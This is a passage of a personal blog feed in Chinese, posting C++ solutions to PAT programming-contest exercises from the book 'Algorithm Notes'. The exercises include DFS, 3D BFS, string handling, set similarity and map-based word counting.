class="number">-1</span>,nowk,sum,Ksum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;k,&amp;p);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;<span class="built_in">pow</span>(<span class="number">1.0</span>*i,p)&lt;=n;i++)&#123;</span><br><span class="line">        K.push_back(<span class="built_in">pow</span>(<span class="number">1.0</span>*i,p));</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(K.size()<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(maxsum==<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot;Impossible\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d = %d^%d&quot;</span>,n,ans[<span class="number">0</span>],p);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;ans.size();i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; + %d^%d&quot;</span>,ans[i],p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8-2"><a href="#8-2" class="headerlink" title="8.2"></a>8.2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1091</span></span><br><span class="line"><span class="keyword">int</span> m,n,L,t;</span><br><span class="line"><span class="keyword">int</span> X[<span class="number">6</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> Y[<span class="number">6</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> Z[<span class="number">6</span>]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y,z;</span><br><span class="line">&#125;node;</span><br><span class="line"><span class="keyword">int</span> pixel[<span class="number">1290</span>][<span class="number">130</span>][<span class="number">65</span>];</span><br><span class="line"><span class="keyword">bool</span> inq[<span class="number">1290</span>][<span class="number">130</span>][<span class="number">65</span>]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;=n||x&lt;<span class="number">0</span>||y&gt;=m||y&lt;<span class="number">0</span>||z&gt;=L||z&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(pixel[x][y][z]==<span class="number">0</span>||inq[x][y][z]==<span class="literal">true</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> volume=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">queue</span>&lt;Node&gt; Q;</span><br><span class="line">    node.x=x,node.y=y,node.z=z;</span><br><span class="line">    Q.push(node);</span><br><span class="line">    inq[x][y][z]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(!Q.empty())&#123;</span><br><span class="line">        Node top=Q.front();</span><br><span class="line">        Q.pop();</span><br><span class="line">        volume++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> newx=top.x+X[i];</span><br><span class="line">            <span class="keyword">int</span> newy=top.y+Y[i];</span><br><span class="line">            <span class="keyword">int</span> newz=top.z+Z[i];</span><br><span class="line">            <span class="keyword">if</span>(judge(newx,newy,newz))&#123;</span><br><span class="line">                node.x=newx,node.y=newy,node.z=newz;</span><br><span class="line">                Q.push(node);</span><br><span class="line">                inq[newx][newy][newz]=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(volume&gt;=t) <span class="keyword">return</span> volume;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;L,&amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> z=<span class="number">0</span>;z&lt;L;z++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;n;x++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> y=<span class="number">0</span>;y&lt;m;y++)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pixel[x][y][z]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> z=<span class="number">0</span>;z&lt;L;z++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;n;x++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> y=<span class="number">0</span>;y&lt;m;y++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(pixel[x][y][z]==<span class="number">1</span>&amp;&amp;inq[x][y][z]==<span class="literal">false</span>)&#123;</span><br><span class="line">                    ans+=BFS(x,y,z);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第六章</title>
    <url>/2020/02/06/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0-%E7%AC%AC%E5%85%AD%E7%AB%A0/</url>
    <content><![CDATA[<p>第六章书上的题目+Codeup+上机训练</p>
<span id="more"></span>

<h2 id="6-书"><a href="#6-书" class="headerlink" title="6(书)"></a>6(书)</h2><h3 id="6-3"><a href="#6-3" class="headerlink" title="6.3"></a>6.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1060</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">deal</span><span class="params">(<span class="built_in">string</span> s,<span class="keyword">int</span> &amp;e,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(s.length()&gt;<span class="number">0</span>&amp;&amp;s[<span class="number">0</span>]==<span class="string">&#x27;0&#x27;</span>) s.erase(s.begin());</span><br><span class="line">    <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">        s.erase(s.begin());</span><br><span class="line">        <span class="keyword">while</span>(s.length()&gt;<span class="number">0</span>&amp;&amp;s[<span class="number">0</span>]==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">            s.erase(s.begin());</span><br><span class="line">            e--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.length()&amp;&amp;s[k]!=<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">            k++;</span><br><span class="line">            e++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k&lt;s.length()) s.erase(s.begin()+k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(s.length()==<span class="number">0</span>) e=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    k=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">string</span> ans;</span><br><span class="line">    <span class="keyword">while</span>(num&lt;n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&lt;s.length()) ans+=s[k++];</span><br><span class="line">        <span class="keyword">else</span> ans+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> str1,str2,str3,str4;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;str1&gt;&gt;str2;</span><br><span class="line">    <span class="keyword">int</span> e1=<span class="number">0</span>,e2=<span class="number">0</span>;</span><br><span class="line">    str3=deal(str1,e1,n);</span><br><span class="line">    str4=deal(str2,e2,n);</span><br><span class="line">    <span class="keyword">if</span>(str3==str4&amp;&amp;e1==e2) <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;YES 0.&quot;</span>&lt;&lt;str3&lt;&lt;<span class="string">&quot;*10^&quot;</span>&lt;&lt;e1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO 0.&quot;</span>&lt;&lt;str3&lt;&lt;<span class="string">&quot;*10^&quot;</span>&lt;&lt;e1&lt;&lt;<span class="string">&quot; 0.&quot;</span>&lt;&lt;str4&lt;&lt;<span class="string">&quot;*10^&quot;</span>&lt;&lt;e2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="6-上机"><a href="#6-上机" class="headerlink" title="6(上机)"></a>6(上机)</h2><h3 id="6-1"><a href="#6-1" class="headerlink" title="6.1"></a>6.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1047</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">40001</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">2501</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; course[M];</span><br><span class="line"><span class="keyword">char</span> name[N][<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(name[a],name[b])&lt;<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;k);</span><br><span class="line">    <span class="keyword">int</span> num,courseID;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>,name[i],&amp;num);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;num;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;courseID);</span><br><span class="line">            course[courseID].push_back(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,i,course[i].size());</span><br><span class="line">        sort(course[i].begin(),course[i].end(),cmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;course[i].size();j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,name[course[i][j]]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1039</span></span><br><span class="line"><span class="comment">const int N=26*26*26*10+1;</span></span><br><span class="line"><span class="comment">vector&lt;int&gt; selectCoures[N];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int getID(char name[])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int id=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;3;i++)&#123;</span></span><br><span class="line"><span class="comment">        id=id*26+(name[i]-&#x27;A&#x27;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    id=id*10+name[3]-&#x27;0&#x27;;</span></span><br><span class="line"><span class="comment">    return id;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n,k;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;n,&amp;k);</span></span><br><span class="line"><span class="comment">    char name[5];</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;k;i++)&#123;</span></span><br><span class="line"><span class="comment">        int course,num;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d%d&quot;,&amp;course,&amp;num);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;num;j++)&#123;</span></span><br><span class="line"><span class="comment">            scanf(&quot;%s&quot;,name);</span></span><br><span class="line"><span class="comment">            int id=getID(name);</span></span><br><span class="line"><span class="comment">            selectCoures[id].push_back(course);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    //query</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%s&quot;,name);</span></span><br><span class="line"><span class="comment">        int id=getID(name);</span></span><br><span class="line"><span class="comment">        sort(selectCoures[id].begin(),selectCoures[id].end());</span></span><br><span class="line"><span class="comment">        printf(&quot;%s %d&quot;,name,selectCoures[id].size());</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;selectCoures[id].size();j++)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot; %d&quot;,selectCoures[id][j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-2"><a href="#6-2" class="headerlink" title="6.2"></a>6.2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1063</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">51</span>;</span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; st[MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> all=st[b].size();</span><br><span class="line">    <span class="keyword">double</span> same=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator it=st[a].begin();it!=st[a].end();it++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(st[b].find(*it)!=st[b].end()) same++;</span><br><span class="line">        <span class="keyword">else</span> all++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.1f%%\n&quot;</span>,same*<span class="number">100.0</span>/all);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;num;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">            st[i].insert(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;q;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        compare(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-4"><a href="#6-4" class="headerlink" title="6.4"></a>6.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1071</span></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; count1;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;c&lt;=<span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(c&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;c&lt;=<span class="string">&#x27;z&#x27;</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(c&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;c&lt;=<span class="string">&#x27;Z&#x27;</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> str;</span><br><span class="line">    getline(<span class="built_in">cin</span>,str);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;str.length())&#123;</span><br><span class="line">        <span class="built_in">string</span> temp;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;str.length()&amp;&amp;check(str[i])==<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;str[i]&lt;=<span class="string">&#x27;Z&#x27;</span>) str[i]+=<span class="number">32</span>;</span><br><span class="line">            temp+=str[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(count1.find(temp)!=count1.end()) count1[temp]++;</span><br><span class="line">            <span class="keyword">else</span> count1[temp]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;str.length()&amp;&amp;check(str[i])==<span class="literal">false</span>) i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">string</span> ans;</span><br><span class="line">    <span class="keyword">int</span> MAX=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt;::iterator it=count1.begin();it!=count1.end();it++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(it-&gt;second&gt;MAX)&#123;</span><br><span class="line">            ans=it-&gt;first;</span><br><span class="line">            MAX=it-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;MAX&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1054</span></span><br><span class="line"><span class="comment">map&lt;string,int&gt; color;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int m,n;</span></span><br><span class="line"><span class="comment">    string temp;</span></span><br><span class="line"><span class="comment">    